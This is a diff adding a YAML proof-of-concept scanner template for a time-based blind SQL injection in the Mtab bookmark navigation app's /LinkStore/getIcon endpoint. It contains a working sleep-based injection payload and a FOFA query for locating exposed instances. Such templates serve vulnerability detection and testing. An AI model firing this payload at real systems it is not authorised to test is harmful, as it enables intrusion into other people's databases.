@@ -1,0 +1,47 @@
+id: poc-yaml-tsxcw-mtab-geticon-sqli
+info:
+  name: Mtab书签导航程序 LinkStore/getIcon SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: Mtab书签导航程序
+  fofa: title="Mtab书签"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: POST
+  path: /LinkStore/getIcon
+  headers:
+    Content-Type: application/json
+  data: '{"url":"''XOR(if(now()=sysdate(),sleep({{.t1}}),0))XOR''"}'
+  expression: 'status_code == 200 &&
+
+    duration >= t1 &&
+
+    duration <= t2 &&
+
+    contains(body,"未查询到相关信息") &&
+
+    contains(body,"\"msg\":\"no\"")
+
+    '
+- method: POST
+  path: /LinkStore/getIcon
+  headers:
+    Content-Type: application/json
+  data: '{"url":"''XOR(if(now()=sysdate(),sleep({{.t3}}),0))XOR''"}'
+  expression: 'status_code == 200 &&
+
+    duration >= t3 &&
+
+    duration <= t4 &&
+
+    contains(body,"未查询到相关信息") &&
+
+    contains(body,"\"msg\":\"no\"")
+
+    '
+transport: http
